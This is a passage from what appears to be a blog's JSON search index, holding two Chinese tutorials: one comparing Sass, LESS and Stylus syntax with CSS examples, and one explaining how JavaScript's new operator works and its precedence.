CSS 预处理器，修改一个地方就够了！ 嵌套如果我们需要在CSS中相同的 parent 引用多个元素，这将是非常乏味的，你需要一遍又一遍地写 parent。例如： 123456789101112section { margin: 10px;}section nav { height: 25px;}section nav a { color: #0982C1;}section nav a:hover { text-decoration: underline;} 而如果用 CSS 预处理器，就可以少些很多代码，而且父子节点关系一目了然。这里提到的三个 CSS 框架都是允许嵌套语法： 123456789101112section { margin: 10px; nav { height: 25px; a { color: #0982C1; &amp;amp;:hover { text-decoration: underline; } } }} 最终生成的 CSS 结果是： 123456789101112section { margin: 10px;}section nav { height: 25px;}section nav a { color: #0982C1;}section nav a:hover { text-decoration: underline;} 非常之方便！ Mixins (混入)Mixins 有点像是函数或者是宏，当你某段 CSS 经常需要在多个元素中使用时，你可以为这些共用的 CSS 定义一个 Mixin，然后你只需要在需要引用这些 CSS 地方调用该 Mixin 即可。Sass 的混入语法： 123456789101112131415@mixin error($borderWidth: 2px) { border: $borderWidth solid #F00; color: #F00;}.generic-error { padding: 20px; margin: 4px; @ include error();}.login-error { left: 12px; position: absolute; top: 20px; @ include error(5px);} Less CSS 的混入语法： 123456789101112131415.error(@borderWidth: 2px) { border: @borderWidth solid #F00; color: #F00;}.generic-error { padding: 20px; margin: 4px; .error();}.login-error { left: 12px; position: absolute; top: 20px; .error(5px);} Stylus 的混入语法： 123456789101112131415error(borderWidth= 2px) { border: borderWidth solid #F00; color: #F00;}.generic-error { padding: 20px; margin: 4px; error();}.login-error { left: 12px; position: absolute; top: 20px; error(5px);} 最终它们都将编译成如下的 CSS 样式： 12345678910111213.generic-error { padding: 20px; margin: 4px; border: 2px solid #f00; color: #f00;}.login-error { left: 12px; position: absolute; top: 20px; border: 5px solid #f00; color: #f00;} 继承当我们需要为多个元素定义相同样式的时候，我们可以考虑使用继承的做法。例如我们经常需要： 123456p,ul,ol { margin: 10px 5px; padding: 2px;} 在 Sass 和 Stylus 我们可以这样写： 12345678910111213.block { margin: 10px 5px; padding: 2px;}p { @extend .block; border: 1px solid #EEE;}ul, ol { @extend .block; color: #333; text-transform: uppercase;} 在这里首先定义 .block 块，然后让 p 、ul 和 ol 元素继承 .block ，最终生成的 CSS 如下： 1234567891011.block, p, ul, ol { margin: 10px 5px; padding: 2px;}p { border: 1px solid #EEE;}ul, ol { color: #333; text-transform: uppercase;} 在这方面 Less 表现的稍微弱一些，更像是混入写法： 12345678910111213.block { margin: 10px 5px; padding: 2px;}p { .block; border: 1px solid #EEE;}ul, ol { .block; color: #333; text-transform: uppercase;} 生成的 CSS 如下： 12345678910111213141516.block { margin: 10px 5px; padding: 2px;}p { margin: 10px 5px; padding: 2px; border: 1px solid #EEE;}ul,ol { margin: 10px 5px; padding: 2px; color: #333; text-transform: uppercase;} 你所看到的上面的代码中，.block 的样式将会被插入到相应的你想要继承的选择器中，但需要注意的是优先级的问题。 导入 (Import)很多 CSS 开发者对导入的做法都不太感冒，因为它需要多次的 HTTP 请求。但是在 CSS 预处理器中的导入操作则不同，它只是在语义上包含了不同的文件，但最终结果是一个单一的 CSS 文件，如果你是通过 @ import “file.css”; 导入 CSS 文件，那效果跟普通的 CSS 导入一样。注意：导入文件中定义的混入、变量等信息也将会被引入到主样式文件中，因此需要避免它们互相冲突。 12345678910reset.css:body { background: #EEE;}main.xxx:@import &quot;reset.css&quot;;@import &quot;file.{type}&quot;;p { background: #0982C1;} 最终生成的 CSS： 1234567@import &quot;reset.css&quot;;body { background: #EEE;}p { background: #0982C1;} 颜色函数CSS 预处理器一般都会内置一些颜色处理函数用来对颜色值进行处理，例如加亮、变暗、颜色梯度等。Sass： 12345678lighten($color, 10%);darken($color, 10%);saturate($color, 10%);desaturate($color, 10%);grayscale($color);complement($color);invert($color);mix($color1, $color2, 50%); 上面只是简单列了 Sass 的一些基本颜色处理函数，完整的列表请看 Sass Documentation.下面是一个具体的例子： 12345$color: #0982C1;h1 { background: $color; border: 3px solid darken($color, 50%);} Less: 1234567lighten(@color, 10%);darken(@color, 10%);saturate(@color, 10%);desaturate(@color, 10%);spin(@color, 10);spin(@color, -10);mix(@color1, @color2); LESS 完整的颜色函数列表请看 LESS Documentation.LESS 使用颜色函数的例子： 12345@color: #0982C1;h1 { background: @color; border: 3px solid darken(@color, 50%);} Stylus: 1234lighten(color, 10%);darken(color, 10%);saturate(color, 10%);desaturate(color, 10%); 完整的颜色函数列表请阅读 Stylus Documentation.实例： 1234color = #0982C1h1 background color border 3px solid darken(color, 50%) 运算符你可以直接在 CSS 预处理器中进行样式的计算，例如： 123456body { margin: (14px/2); top: 50px + 100px; right: 100px - 50px; left: 10 * 10;} 一些跟具体浏览器相关的处理这是宣传使用预处理的原因之一，并且是一个很好的理由，这样可以节省的大量的时间和汗水。创建一个mixin来处理不同浏览器的CSS写法是很简单的，节省了大量的重复工作和痛苦的代码编辑。Sass 12345678@mixin border-radius($values) { -webkit-border-radius: $values; -moz-border-radius: $values; border-radius: $values;}div { @ include border-radius(10px);} Less 12345678.border-radius(@values) { -webkit-border-radius: @values; -moz-border-radius: @values; border-radius: @values;}div { .border-radius(10px);} Stylus 12345678border-radius(values) { -webkit-border-radius: values; -moz-border-radius: values; border-radius: values;}div { border-radius(10px);} 编译结果： 12345div { -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px;} 3D文本要生成具有 3D 效果的文本可以使用 text-shadows ，唯一的问题就是当要修改颜色的时候就非常的麻烦，而通过 mixin 和颜色函数可以很轻松的实现：Sass 123456789101112@mixin text3d($color) { color: $color; text-shadow: 1px 1px 0px darken($color, 5%), 2px 2px 0px darken($color, 10%), 3px 3px 0px darken($color, 15%), 4px 4px 0px darken($color, 20%), 4px 4px 2px #000;}h1 { font-size: 32pt; @ include text3d(#0982c1);} Less 123456789101112.text3d(@color) { color: @color; text-shadow: 1px 1px 0px darken(@color, 5%), 2px 2px 0px darken(@color, 10%), 3px 3px 0px darken(@color, 15%), 4px 4px 0px darken(@color, 20%), 4px 4px 2px #000;}span { font-size: 32pt; .text3d(#0982c1);} Stylus 123456text3d(color) color: color text-shadow: 1px 1px 0px darken(color, 5%), 2px 2px 0px darken(color, 10%), 3px 3px 0px darken(color, 15%), 4px 4px 0px darken(color, 20%), 4px 4px 2px #000span font-size: 32pt text3d(#0982c1) 生成的 CSS 123456789span { font-size: 32pt; color: #0982c1; text-shadow: 1px 1px 0px #097bb7, 2px 2px 0px #0875ae, 3px 3px 0px #086fa4, 4px 4px 0px #07689a, 4px 4px 2px #000;} 列 (Columns)使用数值操作和变量可以很方便的实现适应屏幕大小的布局处理。Sass 12345678910111213141516$siteWidth: 1024px;$gutterWidth: 20px;$sidebarWidth: 300px;body { margin: 0 auto; width: $siteWidth;}.content { float: left; width: $siteWidth - ($sidebarWidth+$gutterWidth);}.sidebar { float: left; margin-left: $gutterWidth; width: $sidebarWidth;} Less 12345678910111213141516@siteWidth: 1024px;@gutterWidth: 20px;@sidebarWidth: 300px;body { margin: 0 auto; width: @siteWidth;}.content { float: left; width: @siteWidth - (@sidebarWidth+@gutterWidth);}.sidebar { float: left; margin-left: @gutterWidth; width: @sidebarWidth;} Stylus 12345678910111213141516siteWidth = 1024px;gutterWidth = 20px;sidebarWidth = 300px;body { margin: 0 auto; width: siteWidth;}.content { float: left; width: siteWidth - (sidebarWidth+gutterWidth);}.sidebar { float: left; margin-left: gutterWidth; width: sidebarWidth;} 实际效果 12345678910111213body { margin: 0 auto; width: 1024px;}.content { float: left; width: 704px;}.sidebar { float: left; margin-left: 20px; width: 300px;} 错误报告如果你经常 CSS 你会发现很难找到 CSS 中错误的地方，这也是预处理框架的好处，它会报告错误，你可以从这篇文章中学习如何让 CSS 框架错误报告。 注释以上三种框架都支持形如 的多行注释以及 // 的单行注释。","link":"/2017/03/24/%E6%AF%94%E8%BE%83%E4%B8%89%E4%B8%AACSS%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%EF%BC%88%E6%A1%86%E6%9E%B6%EF%BC%89-Sass%E3%80%81LESS%E5%92%8CStylus/"},{"title":"理解js中的new","text":"新生成了一个对象 链接到原型 绑定 this 返回新对象 在调用 new 的过程中会发生以上四件事情，我们也可以试着来自己实现一个 new 12345678910111213function create() { // 创建一个空的对象 let obj = new Object() // 获得构造函数 let Con = [].shift.call(arguments) // 链接到原型 obj.__proto__ = Con.prototype // 绑定 this，执行构造函数 let result = Con.apply(obj, arguments) // 确保 new 出来的是个对象 return typeof result === 'object' ? result : obj} 对于实例对象来说，都是通过 new 产生的，无论是 function Foo() 还是 let a = { b : 1 } 。 对于创建一个对象来说，更推荐使用字面量的方式创建对象（无论性能上还是可读性）。因为你使用 new Object() 的方式创建对象需要通过作用域链一层层找到 Object，但是你使用字面量的方式就没这个问题。 12345function Foo() {}// function 就是个语法糖// 内部等同于 new Function()let a = { b: 1 }// 这个字面量内部也是使用了 new Object() 对于 new 来说，还需要注意下运算符优先级。 12345678910111213function Foo() { return this;}Foo.getName = function () { console.log('1');};Foo.prototype.getName = function () { console.log('2');};new Foo.getName(); // -&gt; 1new Foo().getName(); // -&gt; 2 从上图可以看出，new Foo() 的优先级大于 new Foo ，所以对于上述代码来说可以这样划分执行顺序 12new (Foo.getName());(new Foo()).getName(); 对于第一个函数来说，先执行了 Foo.getName() ，所以结果为 1；对于后者来说，先执行 new Foo() 产生了一个实例，然后通过原型链找到了 Foo 上的 getName 函数，所以结果为 2。","link":"/2021/10/23/%E7%90%86%E8%A7%A3js%E4%B8%AD%E7%9A%84new/"}],"tags":[{"name":"html","slug":"html","link":"/tags/html/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"Vue","slug":"Vue","link":"/tags/Vue/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"node","slug":"node","link":"/tags/node/"},{"name":"react","slug":"react","link":"/tags/react/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"http","slug":"http","link":"/tags/http/"},{"name":"微信小程序","slug":"微信小程序","link":"/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"categories":[]}